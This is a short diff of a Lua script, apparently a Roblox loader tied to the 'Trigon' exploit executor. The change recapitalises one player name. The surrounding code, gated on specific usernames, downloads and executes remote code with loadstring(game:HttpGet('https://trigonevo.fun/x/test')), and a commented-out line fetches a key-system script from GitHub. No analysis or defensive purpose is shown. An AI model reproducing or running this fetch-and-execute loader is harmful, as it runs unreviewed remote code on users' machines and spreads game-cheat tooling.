@@ -10,7 +10,7 @@ if plrName == "Farthening" or plrName == "webportaI" then
 end
 	
 if true then
-	if plrName == "Oni_Princess" or plrName == "stryla_alt1" or  plrName == "Almahir2021"  then 
+	if plrName == "Oni_Princess" or plrName == "Stryla_alt1" or  plrName == "Almahir2021"  then 
 		print(2)
 		loadstring(game:HttpGet("https://trigonevo.fun/x/test",true))()
 		--loadstring(game:HttpGet("https://raw.githubusercontent.com/relbaldski/bald/refs/heads/main/Trigon-keysystem.lua",true))()
